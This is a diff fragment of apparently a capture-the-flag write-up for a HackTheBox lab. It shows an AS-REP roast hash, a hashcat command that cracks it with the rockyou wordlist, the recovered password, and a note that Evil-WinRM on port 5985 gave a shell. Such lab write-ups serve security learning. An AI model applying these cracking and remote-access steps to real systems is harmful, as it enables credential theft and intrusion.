@@ -175,4 +175,6 @@ $krb5asrep$23$svc-alfresco@HTB:7d06e635b0cb7138687d07f29a62982b$619acf894e16cd1a
 ```
 hashcat -m 18200 svc.kerb /usr/share/wordlists/rockyou.txt --force
 ```
-- 
+- hashcat gave password s3rvice
+- now try evilwinrm with these creds and we got a shell we see its port open whuch is 5985
+-  
